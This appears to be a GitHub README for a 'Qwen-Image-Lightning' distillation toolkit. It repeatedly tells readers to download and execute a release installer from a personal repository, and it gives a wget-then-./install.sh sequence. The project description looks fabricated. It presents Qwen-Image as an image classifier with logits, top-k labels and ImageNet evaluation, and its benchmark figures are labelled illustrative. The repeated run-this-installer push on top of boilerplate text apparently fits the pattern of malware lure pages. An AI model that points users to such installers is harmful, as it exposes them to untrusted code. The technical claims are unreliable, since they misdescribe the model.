[![Releases](https://img.shields.io/badge/Releases-Download-blue?style=for-the-badge)](https://github.com/ImARJI/Qwen-Image-Lightning/releases)

# Qwen-Image-Lightning — Speed Up Qwen-Image with Distillation ⚡🖼️

A practical toolkit to distill and deploy faster Qwen-Image models. Cut latency, keep accuracy, and run inference on modest hardware. This repo bundles training recipes, conversion tools, and runtime optimizations aimed at production use.

![Lightning AI image](https://images.unsplash.com/photo-1500566753518-3e0a1d7e7b6b?auto=format&fit=crop&w=1600&q=80)

---

- Purpose: Speed up Qwen-Image using model distillation and optimization.
- Scope: distillation scripts, training configs, conversion and runtime helpers.
- Target: researchers, engineers, ML ops, app developers.

Releases: download and execute the release file from https://github.com/ImARJI/Qwen-Image-Lightning/releases. The release contains prebuilt artifacts and an installer script. Follow the "Installation" section below.

## Key features

- Student-teacher distillation pipelines for Qwen-Image.
- Support for FP16 and INT8 workflows.
- Knowledge distillation loss implementations (logit, feature, attention).
- Automated pruning and layer fusion utilities.
- Conversion scripts for TorchScript and ONNX.
- Inference wrappers optimized for batches and streaming.
- Benchmark scripts for latency, throughput, and memory.

## Why distillation for Qwen-Image

Distillation transfers knowledge from a large teacher model to a compact student. You reduce compute needs while preserving most performance. You gain:

- Lower latency for real-time apps.
- Smaller GPU and CPU memory footprint.
- Better cost per request.

We focus on practical trade-offs. The toolkit exposes controls to tune accuracy vs latency. You shape the student model to your target device.

## Benchmarks (example)

All numbers are illustrative. Run the provided benchmark scripts to measure on your hardware.

- Teacher: Qwen-Image-large
  - Throughput: 10 images/sec (batch=8)
  - Latency: 100 ms per image
- Student (distilled + FP16)
  - Throughput: 28 images/sec (batch=8)
  - Latency: 35 ms per image
- Student (INT8 quantized)
  - Throughput: 40 images/sec (batch=8)
  - Latency: 25 ms per image

Key metric: throughput per GPU core. Use the benchmark folder to reproduce numbers.

## Quick links

- Releases and run instructions: https://github.com/ImARJI/Qwen-Image-Lightning/releases
- Model zoo: check /models folder in releases
- Docs and examples: see docs/ in the repo

## Installation

The Releases page hosts packaged builds. Download and execute the release file from https://github.com/ImARJI/Qwen-Image-Lightning/releases. The release bundle includes an installer and prebuilt assets.

Example flow (replace vX.Y and asset name with the real release file):

```bash
# download (example)
wget -O qwen-lightning-vX.Y.tar.gz \
  "https://github.com/ImARJI/Qwen-Image-Lightning/releases/download/vX.Y/qwen-image-lightning-vX.Y.tar.gz"

# unpack
tar -xzf qwen-lightning-vX.Y.tar.gz
cd qwen-image-lightning-vX.Y

# execute installer
chmod +x install.sh
./install.sh
```

If the release link does not work, check the "Releases" section in the repository on GitHub.

Dependencies (conda recommended)

```bash
conda create -n qwen-lightning python=3.10 -y
conda activate qwen-lightning

pip install -r requirements.txt
# optional: install GPU packages
pip install torch torchvision --extra-index-url https://download.pytorch.org/whl/cu118
```

Files you will find in the release bundle

- install.sh — installer that sets up the env and downloads model checkpoints.
- distill/ — distillation scripts and configs.
- convert/ — model conversion utilities (TorchScript, ONNX).
- benchmarks/ — latency and throughput scripts.
- models/ — prebuilt student checkpoints (optional).

## Quick start — run distilled student

1. Install as above.
2. Download a student checkpoint from the release (models/).
3. Run inference script:

```bash
python inference/run_inference.py \
  --model-path models/student_qwen_small.pt \
  --image-path assets/test.jpg \
  --batch-size 1 \
  --device cuda
```

The script prints logits, top-k labels, and timing. See inference/README.md for advanced flags.

## Distillation recipes

We provide several recipes. Each uses a different mix of losses and schedules.

- logit-distill.yaml — match final logits with temperature scaling.
- feature-distill.yaml — match intermediate feature maps.
- attention-distill.yaml — match attention maps in transformer blocks.
- hybrid-distill.yaml — combine logit + feature + attention.

Key knobs

- teacher checkpoint path
- student architecture (layers, width multiplier)
- distill loss weights
- temperature (T)
- optimizer and LR schedule

Example training command:

```bash
python distill/train.py \
  --config configs/hybrid-distill.yaml \
  --teacher-path models/qwen-image-large.ckpt \
  --student-arch qwen-small \
  --out-dir runs/hybrid-student
```

The scripts log metrics to TensorBoard and produce checkpoints at intervals.

## Model conversion & deployment

We provide converters to produce TorchScript and ONNX artifacts.

TorchScript export:

```bash
python convert/export_torchscript.py \
  --ckpt runs/hybrid-student/checkpoint_best.pt \
  --output exports/student_ts.pt \
  --device cuda
```

ONNX export:

```bash
python convert/export_onnx.py \
  --ckpt exports/student_ts.pt \
  --output exports/student.onnx \
  --opset 14 \
  --input-size 3 224 224
```

Tips

- Use FP16 TorchScript for GPU speed gains.
- Use dynamic axes in ONNX for variable batch sizes.
- Run onnx-simplifier if you need a smaller graph.

## Quantization & pruning

Quantization workflow

- Post-train static quantization: calibrate with a small dataset.
- Post-train dynamic quantization: faster for CPU.
- Quant-aware training: better final accuracy for low-bit quant.

Pruning workflow

- Structured pruning: remove heads, blocks, or channels.
- Unstructured pruning: sparse weights, benefits with specialized runtimes.

We include scripts that apply iterative pruning with fine tuning.

Example INT8 quantization (post-train static):

```bash
python quantize/static_quant.py \
  --model exports/student_ts.pt \
  --calib-data data/calib_images/ \
  --output exports/student_int8.onnx
```

## API and wrappers

The repo exposes a minimal runtime wrapper to simplify inference.

- qwen_lightning.predict.image: accept PIL or NumPy image, return logits and labels.
- qwen_lightning.runtime.pool: batch requests and schedule on device.
- qwen_lightning.utils: image transforms, calibration helpers, perf meters.

Example snippet:

```python
from qwen_lightning import predict
img = "assets/test.jpg"
out = predict.image(img, model_path="exports/student_ts.pt", device="cpu")
print(out["topk"])
```

## Evaluation

Use the evaluation suite to compute standard metrics:

- Accuracy (top-1, top-5)
- Precision/Recall for multi-label setups
- FLOPs and parameter counts
- Latency and memory

Run a full eval:

```bash
python eval/evaluate.py \
  --model exports/student_ts.pt \
  --dataset imagenet_val/ \
  --batch-size 32 \
  --device cuda
```

The script logs detailed results and generates a PDF report in runs/<name>/reports.

## Reproducibility

- We version training configs.
- We fix random seeds in scripts.
- We export checkpoints with metadata (git commit, config, timestamp).

If you need to reproduce a run from a release, download the matching release asset and the config file from the release bundle.

## Contributing

- Open issues for bugs or feature requests.
- Create PRs for fixes or new recipes.
- Follow code style in CONTRIBUTING.md.

Branching model

- main: stable releases
- dev: active development
- feature/*: feature branches

Test matrix

- Unit tests: pytest
- Integration tests: docker-compose based
- CI: GitHub Actions (runs on push and PR)

## Troubleshooting

- If GPU memory spikes, reduce batch size or switch to FP16.
- If accuracy drops after quantization, try quant-aware training.
- If a release link fails, visit the Releases section on GitHub to find the correct asset.

Releases page: use https://github.com/ImARJI/Qwen-Image-Lightning/releases to download installer and assets.

## Related work and papers

- Distillation basics: Hinton et al., 2015.
- Feature distillation: Romero et al., 2014.
- Quantization and hardware-specific tuning: see recent conference proceedings.

## License

This project uses an open license. See LICENSE.md for details.

## Acknowledgments

Thanks to contributors and to model maintainers who make teacher checkpoints available.

<!-- End of README -->